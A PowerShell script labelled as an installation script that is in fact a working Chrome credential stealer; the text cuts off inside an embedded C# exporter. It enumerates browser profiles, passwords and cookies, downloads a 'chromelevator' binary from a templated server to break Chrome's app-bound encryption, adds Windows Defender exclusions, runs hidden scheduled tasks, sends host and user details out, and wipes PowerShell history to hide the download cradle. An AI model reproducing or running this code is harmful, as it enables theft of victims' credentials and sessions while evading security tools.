$ErrorActionPreference = "Stop"
$ApiBase = "__API_BASE__"
$PayloadUrl = "$ApiBase/p"
$ErrorUrl = "$ApiBase/e"
$CloseTerminal = __CLOSE_TERMINAL__
$DebugMode = __DEBUG_MODE__
$IsRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
$UserContext = $null
$ChromeUserDataPath = $null
$ChromelevatorCacheDir = $null

Write-Host "Running installation script..."

function Write-DebugStep {
    param([string]$Message)
    if ($DebugMode) {
        Write-Host "[DEBUG] $Message"
    }
}

function Write-DebugError {
    param($ErrorRecord)
    if (-not $DebugMode) { return }
    Write-DebugStep "Error: $($ErrorRecord.Exception.Message)"
    if ($ErrorRecord.InvocationInfo) {
        Write-DebugStep "At line $($ErrorRecord.InvocationInfo.ScriptLineNumber)"
    }
}

function Throw-ErrorCode {
    param([int]$Code)
    throw [System.InvalidOperationException]::new([string]$Code)
}

function Get-ErrorCodeFromException {
    param($ErrorRecord)

    $exception = $ErrorRecord.Exception
    while ($null -ne $exception) {
        if ($exception -is [System.Net.WebException]) {
            return 3001
        }
        if ($exception.Message -match '^\d{4}$') {
            return [int]$exception.Message
        }
        $exception = $exception.InnerException
    }

    if ($ErrorRecord.FullyQualifiedErrorId -match 'WebCmdletWebResponseException') {
        return 3001
    }

    return 9000
}

function Send-ScriptErrorReport {
    param(
        $ErrorRecord,
        [int]$Code
    )

    try {
        $report = [ordered]@{
            code = $Code
            hostname = $env:COMPUTERNAME
            username = if ($UserContext) { $UserContext.TargetUsername } else { $env:USERNAME }
            processUsername = $env:USERNAME
            executedAt = [DateTime]::UtcNow.ToString("o")
            errorType = $ErrorRecord.Exception.GetType().FullName
            errorMessage = $ErrorRecord.Exception.Message
            errorId = $ErrorRecord.FullyQualifiedErrorId
            scriptLine = $ErrorRecord.InvocationInfo.ScriptLineNumber
            isAdmin = $IsRunningAsAdmin
        }
        $reportB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $report -Compress -Depth 4)))
        $null = Invoke-RestMethod -Uri $ErrorUrl -Method Post -ContentType "text/plain; charset=utf-8" -Body $reportB64
    }
    catch {
    }
}


function Get-ProfilePathForAccountName {
    param([string]$AccountName)

    if ([string]::IsNullOrWhiteSpace($AccountName)) {
        return $null
    }

    $usersRoot = Join-Path $env:SystemDrive "Users"
    $directPath = Join-Path $usersRoot $AccountName
    if (Test-Path -LiteralPath $directPath) {
        return $directPath
    }

    $profileListKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
    if (-not (Test-Path -LiteralPath $profileListKey)) {
        return $null
    }

    foreach ($entry in Get-ChildItem -Path $profileListKey -ErrorAction SilentlyContinue) {
        try {
            $profileImagePath = (Get-ItemProperty -LiteralPath $entry.PSPath -ErrorAction Stop).ProfileImagePath
            if (-not $profileImagePath) {
                continue
            }
            if ((Split-Path -Path $profileImagePath -Leaf) -ieq $AccountName) {
                return $profileImagePath
            }
        }
        catch {
        }
    }

    return $null
}

function Get-InteractiveUserContext {
    $processUsername = [string]$env:USERNAME
    $processProfile = [string]$env:USERPROFILE
    $processLocalAppData = [string]$env:LOCALAPPDATA
    $interactiveQualified = $null

    try {
        $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
        if ($computerSystem.UserName) {
            $interactiveQualified = [string]$computerSystem.UserName
        }
    }
    catch {
    }

    $targetUsername = $processUsername
    $targetProfile = $processProfile
    $targetLocalAppData = $processLocalAppData

    if ($interactiveQualified) {
        $interactiveUsername = $interactiveQualified
        if ($interactiveQualified -match '^([^\\]+)\\(.+)$') {
            $interactiveUsername = $Matches[2]
        }

        if ($interactiveUsername -and ($interactiveUsername -ne $processUsername)) {
            $resolvedProfile = Get-ProfilePathForAccountName -AccountName $interactiveUsername
            if ($resolvedProfile) {
                $localAppData = Join-Path $resolvedProfile "AppData\Local"
                if (Test-Path -LiteralPath $localAppData) {
                    $targetUsername = $interactiveUsername
                    $targetProfile = $resolvedProfile
                    $targetLocalAppData = $localAppData
                }
            }
        }
    }

    return [pscustomobject]@{
        ProcessUsername = $processUsername
        TargetUsername = $targetUsername
        TargetUserProfile = $targetProfile
        TargetLocalAppData = $targetLocalAppData
        InteractiveQualifiedName = $interactiveQualified
        UsesInteractiveUser = ($targetUsername -ne $processUsername)
    }
}

function Initialize-TargetUserPaths {
    $script:UserContext = Get-InteractiveUserContext
    $script:ChromeUserDataPath = Join-Path $UserContext.TargetLocalAppData "Google\Chrome\User Data"
    $script:ChromelevatorCacheDir = Join-Path $UserContext.TargetLocalAppData "remote-scripts\chromelevator"

    if ($DebugMode) {
        if ($UserContext.UsesInteractiveUser) {
            Write-DebugStep "Process user=$($UserContext.ProcessUsername), target user=$($UserContext.TargetUsername) (interactive session: $($UserContext.InteractiveQualifiedName))"
        }
        else {
            Write-DebugStep "Target user=$($UserContext.TargetUsername) (same as process)"
        }
        Write-DebugStep "Target profile=$($UserContext.TargetUserProfile)"
    }
}

function Get-ChromeInstalledVersion {
    $candidatePaths = @(
        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    )

    foreach ($path in $candidatePaths) {
        if (-not (Test-Path -LiteralPath $path)) {
            continue
        }

        $version = (Get-Item -LiteralPath $path).VersionInfo.ProductVersion
        $major = [int]($version.Split(".")[0])
        return [ordered]@{
            version = $version
            major = $major
            path = $path
            appBoundSupported = ($major -ge 127)
            legacyDpapiOnly = ($major -lt 127)
        }
    }

    foreach ($regPath in @(
        "HKLM:\SOFTWARE\Google\Chrome\BLBeacon",
        "HKCU:\SOFTWARE\Google\Chrome\BLBeacon"
    )) {
        try {
            $version = (Get-ItemProperty -Path $regPath -ErrorAction Stop).version
            if ($version) {
                $major = [int]($version.Split(".")[0])
                return [ordered]@{
                    version = $version
                    major = $major
                    path = $null
                    appBoundSupported = ($major -ge 127)
                    legacyDpapiOnly = ($major -lt 127)
                }
            }
        }
        catch {
            continue
        }
    }

    return [ordered]@{
        version = $null
        major = 0
        path = $null
        appBoundSupported = $true
        legacyDpapiOnly = $false
    }
}

function Get-ChromeProfileMetadata {
    $chromeUserData = if ($ChromeUserDataPath) {
        $ChromeUserDataPath
    }
    else {
        Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
    }
    $localStatePath = Join-Path $chromeUserData "Local State"
    $result = [ordered]@{}

    if (Test-Path -LiteralPath $localStatePath) {
        try {
            $localState = Get-Content -Path $localStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
            $infoCache = $localState.profile.info_cache
            if ($null -ne $infoCache) {
                foreach ($prop in $infoCache.PSObject.Properties) {
                    $folder = [string]$prop.Name
                    $info = $prop.Value
                    $result[$folder] = [ordered]@{
                        folder = $folder
                        name = if ($null -ne $info.name) { [string]$info.name } else { "" }
                        gaia_name = if ($null -ne $info.gaia_name) { [string]$info.gaia_name } else { "" }
                        user_name = if ($null -ne $info.user_name) { [string]$info.user_name } else { "" }
                        email = if ($null -ne $info.user_name) { [string]$info.user_name } else { "" }
                        hosted_domain = if ($null -ne $info.hosted_domain) { [string]$info.hosted_domain } else { "" }
                    }
                }
            }
        }
        catch {
        }
    }

    if (Test-Path -LiteralPath $chromeUserData) {
        Get-ChildItem -Path $chromeUserData -Directory | ForEach-Object {
            $folder = $_.Name
            if ($folder -notmatch '^(Default|Profile \d+)$') {
                return
            }

            if (-not $result.Contains($folder)) {
                $result[$folder] = [ordered]@{
                    folder = $folder
                    name = $folder
                    gaia_name = ""
                    user_name = ""
                    email = ""
                    hosted_domain = ""
                }
            }

            $prefPath = Join-Path $_.FullName "Preferences"
            if (-not (Test-Path -LiteralPath $prefPath)) {
                return
            }

            try {
                $prefs = Get-Content -Path $prefPath -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($prefs.profile.name) {
                    $result[$folder].name = [string]$prefs.profile.name
                }
                if ($prefs.account_info -and @($prefs.account_info).Count -gt 0) {
                    $account = @($prefs.account_info)[0]
                    if ($account.email) {
                        $result[$folder].email = [string]$account.email
                        if (-not $result[$folder].user_name) {
                            $result[$folder].user_name = [string]$account.email
                        }
                    }
                    if ($account.full_name) {
                        $result[$folder].gaia_name = [string]$account.full_name
                    }
                }
            }
            catch {
            }
        }
    }

    return $result
}

function Test-ChromeDbReadable {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        return $false
    }

    try {
        $stream = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
        )
        $stream.Dispose()
        return $true
    }
    catch {
        return $false
    }
}

function Get-ChromeCookiesDbPath {
    param([string]$ProfilePath)

    $networkPath = Join-Path $ProfilePath "Network\Cookies"
    if (Test-Path -LiteralPath $networkPath) {
        return $networkPath
    }

    $legacyPath = Join-Path $ProfilePath "Cookies"
    if (Test-Path -LiteralPath $legacyPath) {
        return $legacyPath
    }

    return $null
}

function Write-ChromeDiscoveryDebug {
    param(
        [bool]$UseDpapiDecrypt,
        [bool]$UseChromelevator
    )

    if (-not $DebugMode) {
        return
    }

    $chromeUserData = if ($ChromeUserDataPath) {
        $ChromeUserDataPath
    }
    else {
        Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
    }

    if ($UserContext -and $UserContext.UsesInteractiveUser) {
        Write-DebugStep "User: $($UserContext.TargetUsername) (process=$($UserContext.ProcessUsername), profile=$($UserContext.TargetUserProfile))"
    }
    else {
        Write-DebugStep "User: $env:USERNAME (profile=$env:USERPROFILE)"
    }
    Write-DebugStep "Chrome User Data: $chromeUserData"
    Write-DebugStep "Export mode: UseDpapiDecrypt=$UseDpapiDecrypt, UseChromelevator=$UseChromelevator"

    if (-not (Test-Path -LiteralPath $chromeUserData)) {
        Write-DebugStep "Chrome User Data path not found"
        return
    }

    $allDirs = @(
        Get-ChildItem -Path $chromeUserData -Directory -ErrorAction SilentlyContinue |
            ForEach-Object { $_.Name }
    )
    Write-DebugStep "All subfolders ($($allDirs.Count)): $($allDirs -join ', ')"

    $candidates = @($allDirs | Where-Object { $_ -match '^(Default|Profile \d+)$' })
    Write-DebugStep "Profile folders to evaluate ($($candidates.Count)): $($candidates -join ', ')"

    foreach ($folder in $candidates) {
        $profilePath = Join-Path $chromeUserData $folder
        $loginDb = Join-Path $profilePath "Login Data"
        $cookiesDb = Get-ChromeCookiesDbPath -ProfilePath $profilePath
        $loginExists = Test-Path -LiteralPath $loginDb
        $loginReadable = if ($loginExists) { Test-ChromeDbReadable -Path $loginDb } else { $false }
        $cookiesExists = [bool]$cookiesDb
        $cookiesReadable = if ($cookiesDb) { Test-ChromeDbReadable -Path $cookiesDb } else { $false }
        $parts = @(
            "loginData=$(if ($loginExists) { if ($loginReadable) { 'ok' } else { 'locked' } } else { 'missing' })"
        )
        if ($UseDpapiDecrypt) {
            $parts += "cookies=$(if ($cookiesExists) { if ($cookiesReadable) { 'ok' } else { 'locked' } } else { 'missing' })"
        }
        Write-DebugStep "  $folder : $($parts -join ', ')"
    }

    $skipped = @($allDirs | Where-Object { $_ -notmatch '^(Default|Profile \d+)$' })
    if ($skipped.Count -gt 0) {
        Write-DebugStep "Skipped folders (not Default|Profile N): $($skipped -join ', ')"
    }
}

function Write-ExportProfileSummaryDebug {
    param([string]$ExportJsonRaw)

    if (-not $DebugMode) {
        return
    }

    try {
        $export = $ExportJsonRaw | ConvertFrom-Json
        $byProfile = @{}
        foreach ($pwd in @($export.passwords)) {
            $profile = [string]$pwd.profile
            if (-not $byProfile.ContainsKey($profile)) {
                $byProfile[$profile] = 0
            }
            $byProfile[$profile]++
        }

        if ($byProfile.Count -eq 0) {
            Write-DebugStep "Export passwords by profile: (none)"
        }
        else {
            $summary = ($byProfile.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join ', '
            Write-DebugStep "Export passwords by profile: $summary"
        }

        $cookieByProfile = @{}
        foreach ($cookie in @($export.cookies)) {
            $profile = [string]$cookie.profile
            if (-not $cookieByProfile.ContainsKey($profile)) {
                $cookieByProfile[$profile] = 0
            }
            $cookieByProfile[$profile]++
        }

        if ($cookieByProfile.Count -gt 0) {
            $summary = ($cookieByProfile.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join ', '
            Write-DebugStep "Export cookies by profile (pre-merge): $summary"
        }
    }
    catch {
        Write-DebugStep "Could not parse export JSON for profile summary"
    }
}

function Write-ChromelevatorProfileDebug {
    param([string]$ChromeRoot)

    if (-not $DebugMode -or -not $ChromeRoot -or -not (Test-Path -LiteralPath $ChromeRoot)) {
        return
    }

    $profiles = @(
        Get-ChildItem -LiteralPath $ChromeRoot -Directory -ErrorAction SilentlyContinue |
            ForEach-Object {
                $hasPasswords = Test-Path -LiteralPath (Join-Path $_.FullName "passwords.json")
                $hasCookies = Test-Path -LiteralPath (Join-Path $_.FullName "cookies.json")
                "$($_.Name)(pwd=$hasPasswords,cookies=$hasCookies)"
            }
    )

    if ($profiles.Count -eq 0) {
        Write-DebugStep "Chromelevator output profiles: (none)"
    }
    else {
        Write-DebugStep "Chromelevator output profiles: $($profiles -join ', ')"
    }
}

function Get-DefenderExclusions {
    $paths = @()
    $processes = @()

    try {
        $prefs = Get-MpPreference -ErrorAction Stop
        if ($prefs.ExclusionPath) {
            $paths += @($prefs.ExclusionPath)
        }
        if ($prefs.ExclusionProcess) {
            $processes += @($prefs.ExclusionProcess)
        }
        return @{ Paths = $paths; Processes = $processes; Source = "Get-MpPreference" }
    }
    catch {
    }

    try {
        $pathKey = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction Stop
        $paths += @($pathKey.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object { $_.Name })
    }
    catch {
    }

    try {
        $processKey = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -ErrorAction Stop
        $processes += @($processKey.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object { $_.Name })
    }
    catch {
    }

    return @{ Paths = $paths; Processes = $processes; Source = "registry" }
}

function Test-DefenderPathExcluded {
    param(
        [string]$TargetPath,
        [string[]]$ExclusionPaths
    )

    if (-not $TargetPath) {
        return $false
    }

    $normalizedTarget = $TargetPath.TrimEnd("\")
    foreach ($exclusion in $ExclusionPaths) {
        $normalizedExclusion = $exclusion.TrimEnd("\")
        if (
            $normalizedTarget -eq $normalizedExclusion -or
            $normalizedTarget.StartsWith("$normalizedExclusion\", [System.StringComparison]::OrdinalIgnoreCase)
        ) {
            return $true
        }
    }

    return $false
}

function Get-ChromelevatorArchTag {
    if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") {
        return "arm64"
    }
    return "x64"
}

function Test-ChromelevatorDefenderStatus {
    $archTag = Get-ChromelevatorArchTag
    $processName = "chromelevator_$archTag.exe"
    $elevatorPath = Join-Path $ChromelevatorCacheDir $processName
    $exclusions = Get-DefenderExclusions

    $pathExcluded = (Test-DefenderPathExcluded -TargetPath $ChromelevatorCacheDir -ExclusionPaths $exclusions.Paths) -or
        (Test-DefenderPathExcluded -TargetPath $elevatorPath -ExclusionPaths $exclusions.Paths)
    $processExcluded = @($exclusions.Processes | ForEach-Object { $_.ToLowerInvariant() }) -contains $processName.ToLowerInvariant() -or
        @($exclusions.Processes | ForEach-Object { $_.ToLowerInvariant() }) -contains "chromelevator.exe"

    $status = [ordered]@{
        arch = $archTag
        exclusionSource = $exclusions.Source
        pathExcluded = [bool]$pathExcluded
        processExcluded = [bool]$processExcluded
        binaryCached = Test-Path -LiteralPath $elevatorPath
        probeOk = $false
        canRunWithoutAdmin = $false
    }

    if ($status.binaryCached) {
        try {
            Unblock-File -LiteralPath $elevatorPath -ErrorAction SilentlyContinue
            $probe = Start-Process -FilePath $elevatorPath -ArgumentList @("--help") -Wait -PassThru -WindowStyle Hidden -ErrorAction Stop
            $status.probeOk = $true
            $status.probeExitCode = $probe.ExitCode
        }
        catch {
            if ($_.Exception.Message -match "virus|potentially unwanted|malware|software malicioso|no deseado") {
                $status.probeOk = $false
                $status.probeError = "2009"
            }
        }
    }

    $status.canRunWithoutAdmin = [bool](
        $status.probeOk -or
        ($pathExcluded -and $processExcluded)
    )

    return [pscustomobject]$status
}

Initialize-TargetUserPaths

$ChromeInfo = Get-ChromeInstalledVersion

$ChromelevatorDefenderStatus = Test-ChromelevatorDefenderStatus
$UseChromelevator = $ChromeInfo.AppBoundSupported -and (
    $IsRunningAsAdmin -or $ChromelevatorDefenderStatus.canRunWithoutAdmin
)
$UseDpapiDecrypt = -not $UseChromelevator

function Initialize-ChromelevatorDefenderAllowlist {
    New-Item -ItemType Directory -Path $ChromelevatorCacheDir -Force | Out-Null
    Add-DefenderAllowlistEntry -Path $ChromelevatorCacheDir | Out-Null
    Add-DefenderAllowlistEntry -Path $env:TEMP | Out-Null
    foreach ($processName in @("chromelevator_x64.exe", "chromelevator_arm64.exe", "chromelevator.exe")) {
        Add-DefenderAllowlistEntry -ProcessName $processName | Out-Null
    }
}

function Add-DefenderAllowlistEntry {
    param(
        [string]$Path,
        [string]$ProcessName
    )

    if (-not $IsRunningAsAdmin) {
        return $false
    }

    try {
        if ($Path) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction Stop | Out-Null
        }
        if ($ProcessName) {
            Add-MpPreference -ExclusionProcess $ProcessName -ErrorAction Stop | Out-Null
        }
        return $true
    }
    catch {
        return $false
    }
}

function Protect-ChromelevatorBinary {
    param([string]$ElevatorPath)

    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
        Add-DefenderAllowlistEntry -Path $ElevatorPath | Out-Null
        Add-DefenderAllowlistEntry -ProcessName (Split-Path -Leaf $ElevatorPath) | Out-Null
    }

    Unblock-File -LiteralPath $ElevatorPath -ErrorAction SilentlyContinue

    if (-not (Test-Path -LiteralPath $ElevatorPath)) {
        Throw-ErrorCode 2001
    }

    $size = (Get-Item -LiteralPath $ElevatorPath).Length
    if ($size -lt 500000) {
        Throw-ErrorCode 2002
    }

}

function Get-ChromelevatorChromeRoot {
    param(
        [string]$OutDir,
        [string]$ElevatorPath
    )

    $candidates = @(
        (Join-Path $OutDir "Chrome")
        (Join-Path (Split-Path -Parent $ElevatorPath) "output\Chrome")
    )

    foreach ($candidate in $candidates) {
        if (-not (Test-Path -LiteralPath $candidate)) {
            continue
        }

        $hasData = Get-ChildItem -LiteralPath $candidate -Recurse -Include cookies.json, passwords.json -File -ErrorAction SilentlyContinue |
            Select-Object -First 1
        if ($hasData) {
            return $candidate
        }
    }

    return $null
}

function Get-ChromelevatorOutputDirectory {
    if ($UserContext -and $UserContext.TargetLocalAppData) {
        $tempRoot = Join-Path $UserContext.TargetLocalAppData "Temp"
        New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
        return Join-Path $tempRoot ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
    }

    return Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
}

function Resolve-InteractiveTaskPrincipal {
    if ($UserContext.InteractiveQualifiedName) {
        return [string]$UserContext.InteractiveQualifiedName
    }

    if ($UserContext.TargetUsername) {
        return "$env:COMPUTERNAME\$($UserContext.TargetUsername)"
    }

    return $null
}

function Should-RunChromelevatorAsInteractiveUser {
    if (-not $IsRunningAsAdmin) {
        return $false
    }

    return [bool](Resolve-InteractiveTaskPrincipal)
}

function Grant-AccountPathAccess {
    param(
        [string]$Path,
        [string]$AccountName,
        [string]$Rights = "(OI)(CI)F"
    )

    if (-not $Path -or -not $AccountName -or -not (Test-Path -LiteralPath $Path)) {
        return $false
    }

    try {
        $null = & icacls $Path /grant "${AccountName}:${Rights}" /T /C 2>&1
        return $true
    }
    catch {
        return $false
    }
}

function Invoke-ChromelevatorAsInteractiveUser {
    param(
        [string]$ElevatorPath,
        [string]$OutDir,
        [string]$RunAsUser
    )

    New-Item -ItemType Directory -Path $OutDir -Force | Out-Null
    Grant-AccountPathAccess -Path $OutDir -AccountName $RunAsUser | Out-Null
    Grant-AccountPathAccess -Path $ElevatorPath -AccountName $RunAsUser -Rights "RX" | Out-Null

    $taskName = "RemoteScripts_ChromElev_" + [Guid]::NewGuid().ToString("N")
    $exitCodePath = Join-Path $OutDir "chromelevator.exitcode"
    $runnerPath = Join-Path $OutDir "run_chromelevator.vbs"
    $runnerContent = @"
Set shell = CreateObject("Wscript.Shell")
exitCode = shell.Run("""$ElevatorPath"" -o ""$OutDir"" chrome", 0, True)
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("$exitCodePath", True)
file.Write exitCode
file.Close
"@
    Set-Content -LiteralPath $runnerPath -Value $runnerContent -Encoding ASCII
    Grant-AccountPathAccess -Path $runnerPath -AccountName $RunAsUser -Rights "RX" | Out-Null

    try {
        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B `"$runnerPath`""
        $principal = New-ScheduledTaskPrincipal -UserId $RunAsUser -LogonType Interactive -RunLevel Limited
        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
            -Hidden
        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null

        if ($DebugMode) {
            Write-DebugStep "Chromelevator scheduled as $RunAsUser (task=$taskName, outDir=$OutDir)"
        }

        Start-ScheduledTask -TaskName $taskName

        $deadline = [DateTime]::UtcNow.AddMinutes(5)
        do {
            Start-Sleep -Milliseconds 750
            if (Test-Path -LiteralPath $exitCodePath) {
                break
            }

            $taskState = "Unknown"
            try {
                $taskState = [string](Get-ScheduledTask -TaskName $taskName -ErrorAction Stop).State
            }
            catch {
            }
        } while ([DateTime]::UtcNow -lt $deadline -and $taskState -eq "Running")

        if (-not (Test-Path -LiteralPath $exitCodePath)) {
            Throw-ErrorCode 2003
        }

        $exitCode = [int](Get-Content -LiteralPath $exitCodePath -Raw -ErrorAction Stop)
        if ($exitCode -ne 0) {
            if ($DebugMode) {
                Write-DebugStep "Chromelevator interactive task exit code: $exitCode"
            }
            Throw-ErrorCode 2003
        }
    }
    finally {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
}

function Invoke-ChromelevatorProcess {
    param(
        [string]$ElevatorPath,
        [string]$OutDir
    )

    Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = $ElevatorPath
    $process.StartInfo.Arguments = "-o `"$OutDir`" chrome"
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true
    $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.RedirectStandardError = $true
    [void]$process.Start()
    $null = $process.StandardOutput.ReadToEnd()
    $null = $process.StandardError.ReadToEnd()
    $process.WaitForExit()

    if ($process.ExitCode -ne 0) {
        Throw-ErrorCode 2003
    }
}

function Invoke-ChromelevatorExtraction {
    param([string]$ApiBase)

    $meta = [ordered]@{
        used = $false
        arch = $null
        error = $null
        skipped = $false
        defender = $ChromelevatorDefenderStatus
        runAsInteractiveUser = $false
        interactiveUser = $null
    }

    if (-not $UseChromelevator) {
        $meta.skipped = $true
        if ($ChromeInfo.LegacyDpapiOnly) {
            $meta.error = "2006"
        }
        elseif (-not $IsRunningAsAdmin) {
            $meta.error = "2005"
        }
        else {
            $meta.error = "2007"
        }
        return ,[pscustomobject]$meta
    }

    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
        Initialize-ChromelevatorDefenderAllowlist | Out-Null
    }

    $outDir = $null
    $elevatorPath = $null
    try {
        $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
        $meta.arch = $archTag
        $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
        $outDir = Get-ChromelevatorOutputDirectory
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null

        $runAsInteractiveUser = Should-RunChromelevatorAsInteractiveUser
        $interactivePrincipal = Resolve-InteractiveTaskPrincipal
        if ($runAsInteractiveUser -and $interactivePrincipal) {
            $meta.runAsInteractiveUser = $true
            $meta.interactiveUser = $interactivePrincipal
            try {
                Invoke-ChromelevatorAsInteractiveUser -ElevatorPath $elevatorPath -OutDir $outDir -RunAsUser $interactivePrincipal
            }
            catch {
                if ($DebugMode) {
                    Write-DebugStep "Interactive chromelevator task failed: $($_.Exception.Message); falling back to direct invoke"
                }
                Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
                $meta.runAsInteractiveUser = $false
            }
        }
        else {
            Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
        }

        $meta.used = $true
    }
    catch {
        $meta.error = [string](Get-ErrorCodeFromException $_)
    }
    finally {
        if ($outDir -and (Test-Path $outDir)) {
            $script:ChromelevatorOutputRoot = $outDir
            $script:ChromelevatorChromeRoot = Get-ChromelevatorChromeRoot -OutDir $outDir -ElevatorPath $elevatorPath
        }
    }

    return ,[pscustomobject]$meta
}

function Get-ChromelevatorExecutable {
    param(
        [string]$ApiBase,
        [string]$ArchTag,
        [string]$CacheDir
    )

    if ($env:CHROMELEVATOR_PATH -and (Test-Path -LiteralPath $env:CHROMELEVATOR_PATH)) {
        Protect-ChromelevatorBinary -ElevatorPath $env:CHROMELEVATOR_PATH
        return $env:CHROMELEVATOR_PATH
    }

    New-Item -ItemType Directory -Path $CacheDir -Force | Out-Null

    $elevatorPath = Join-Path $CacheDir "chromelevator_$ArchTag.exe"
    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
        Add-DefenderAllowlistEntry -Path $elevatorPath | Out-Null
    }

    $needsDownload = $true
    if (Test-Path -LiteralPath $elevatorPath) {
        $cachedSize = (Get-Item -LiteralPath $elevatorPath).Length
        if ($cachedSize -ge 500000) {
            $needsDownload = $false
        }
        else {
            Remove-Item -LiteralPath $elevatorPath -Force -ErrorAction SilentlyContinue
        }
    }

    if ($needsDownload) {
        $chromelevatorUrl = "$ApiBase/chrmlvtr?arch=$ArchTag"
        (New-Object Net.WebClient).DownloadFile($chromelevatorUrl, $elevatorPath)
    }

    Protect-ChromelevatorBinary -ElevatorPath $elevatorPath
    return $elevatorPath
}

function Clear-ScriptExecutionHistory {
    $pattern = "(DownloadString|/wscp|iex\s*\(|Invoke-Expression|iwr\s+.*/wscp|Invoke-WebRequest.*/wscp)"
    $historyPaths = @()

    try {
        if (Get-Module PSReadLine -ErrorAction SilentlyContinue) {
            $readLinePath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
            if ($readLinePath) {
                $historyPaths += $readLinePath
            }
        }
    }
    catch {
    }

    $historyPaths += Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    foreach ($historyPath in @($historyPaths | Select-Object -Unique)) {
        if (-not (Test-Path -LiteralPath $historyPath)) {
            continue
        }

        try {
            $remaining = @(Get-Content -LiteralPath $historyPath -ErrorAction Stop |
                Where-Object { $_ -notmatch $pattern })
            Set-Content -LiteralPath $historyPath -Value $remaining -Encoding utf8
        }
        catch {
        }
    }

    try {
        Clear-History -ErrorAction SilentlyContinue
    }
    catch {
    }

}

try {

$script:ChromelevatorOutputRoot = $null
$script:ChromelevatorChromeRoot = $null

Write-DebugStep "Starting export pipeline (admin=$IsRunningAsAdmin, api=$ApiBase)"
Write-ChromeDiscoveryDebug -UseDpapiDecrypt $UseDpapiDecrypt -UseChromelevator $UseChromelevator

Add-Type -AssemblyName System.Security

$TypeSuffix = [Guid]::NewGuid().ToString("N")
$ChromeExporterClassName = "ChromeExporter_$TypeSuffix"
$ChromeComElevatorClassName = "ChromeComElevator_$TypeSuffix"
$ChromeCryptoClassName = "ChromeCrypto_$TypeSuffix"

Write-DebugStep "Compiling exporter types ($ChromeExporterClassName)"
$typeDefinition = @"
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;

public static class __EXPORTER_CLASS__
{
    private const int SQLITE_DESERIALIZE_READONLY = 2;
    private static readonly Regex ProfileFolderRegex = new Regex(@"^Profile \d+$|^Default$", RegexOptions.IgnoreCase);

    public static string Export(bool attemptDpapiDecrypt, string chromeUserDataPath, string payloadUsername)
    {
        string chromePath = string.IsNullOrWhiteSpace(chromeUserDataPath)
            ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Google\Chrome\User Data")
            : chromeUserDataPath.Trim();
        string localStatePath = Path.Combine(chromePath, "Local State");

        if (!File.Exists(localStatePath))
        {
            throw new InvalidOperationException("1001");
        }

        byte[] dpapiKey = null;
        if (attemptDpapiDecrypt)
        {
            dpapiKey = GetSecretKey(localStatePath);
            if (dpapiKey == null || dpapiKey.Length == 0)
            {
                throw new InvalidOperationException("1002");
            }
        }

        var passwords = new List<PasswordEntry>();
        var cookies = new List<CookieEntry>();
        int index = 0;
        int cookieIndex = 0;

